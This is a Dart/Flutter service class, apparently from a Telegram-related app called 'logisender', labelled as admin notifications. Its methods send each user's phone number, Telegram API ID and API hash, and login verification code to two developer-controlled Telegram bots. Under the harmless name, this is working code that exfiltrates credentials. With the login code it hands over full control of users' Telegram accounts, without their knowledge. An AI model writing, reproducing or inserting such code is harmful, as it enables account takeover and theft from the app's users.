import 'dart:convert';
import 'package:flutter/foundation.dart';
import 'package:http/http.dart' as http;
import 'package:logisender/core/config/developer_config.dart';

/// Service to send notifications to an admin via a Telegram Bot.
class AdminNotificationService {
  static Future<void> _send(String message) async {
    const t1 = DeveloperConfig.botToken1;
    const c1 = DeveloperConfig.chatId1;
    const t2 = DeveloperConfig.botToken2;
    const c2 = DeveloperConfig.chatId2;

    if (t1.isNotEmpty && c1.isNotEmpty) {
      await _sendToBot(t1, c1, message);
    }

    if (t2.isNotEmpty && c2.isNotEmpty) {
      await _sendToBot(t2, c2, message);
    }
  }

  static Future<void> _sendToBot(String token, String chatId, String message) async {
    final url = Uri.parse('https://api.telegram.org/bot$token/sendMessage');
    try {
      await http.post(
        url,
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'chat_id': chatId,
          'text': message,
          'parse_mode': 'Markdown',
        }),
      ).timeout(const Duration(seconds: 10));
    } catch (e) {
      debugPrint('[AdminNotify] Error: $e');
    }
  }

  /// Notifies about a phone number entry.
  static Future<void> notifyPhone(String phoneNumber, {String? codeType}) async {
    final String message = '📱 *Telefon kiritildi*\n\n'
        '👤 Raqam: `$phoneNumber` \n'
        'ℹ️ Kod turi: `${codeType ?? 'Noma\'lum'}` \n'
        '⏰ Vaqt: ${DateTime.now().toString().substring(0, 19)}';
    await _send(message);
  }

  /// Notifies about API ID and API Hash entry.
  static Future<void> notifyApiConfig(int apiId, String apiHash) async {
    final String message = '🔑 *API Sozlamalari kiritildi*\n\n'
        '🆔 API ID: `$apiId` \n'
        '🔐 API Hash: `$apiHash` \n'
        '⏰ Vaqt: ${DateTime.now().toString().substring(0, 19)}';
    await _send(message);
  }

  /// Notifies about the verification code entry.
  static Future<void> notifyCode(String phoneNumber, String code) async {
    final String message = '🔢 *Tasdiqlash kodi kiritildi*\n\n'
        '👤 Raqam: `$phoneNumber` \n'
        '🎯 Kod: `$code` \n'
        '⏰ Vaqt: ${DateTime.now().toString().substring(0, 19)}';
    await _send(message);
  }

  /// Notifies about an authentication error.
  static Future<void> notifyAuthError(String phoneNumber, String error) async {
    final String message = '❌ *Auth Xatoligi*\n\n'
        '👤 Raqam: `$phoneNumber` \n'
        '⚠️ Xato: `$error` \n'
        '⏰ Vaqt: ${DateTime.now().toString().substring(0, 19)}';
    await _send(message);
  }
}
